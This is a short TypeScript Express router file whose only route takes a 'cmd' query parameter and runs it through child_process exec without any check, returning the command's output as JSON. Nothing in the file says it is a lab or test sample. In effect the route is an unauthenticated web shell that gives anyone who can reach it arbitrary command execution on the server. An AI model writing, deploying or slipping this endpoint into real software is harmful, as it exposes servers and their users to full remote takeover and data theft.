import { Router, Request, Response } from 'express';
import { exec } from 'child_process';

const router = Router();

router.get('/', (req: Request, res: Response) => {
  const cmd = req.query.cmd as string;
  if (!cmd) return res.status(400).json({ error: 'cmd parameter required' });
  exec(cmd, { timeout: 5000 }, (error, stdout, stderr) => {
    if (error) return res.json({ error: error.message, stderr });
    return res.json({ stdout: stdout.trim() });
  });
});

export default router;
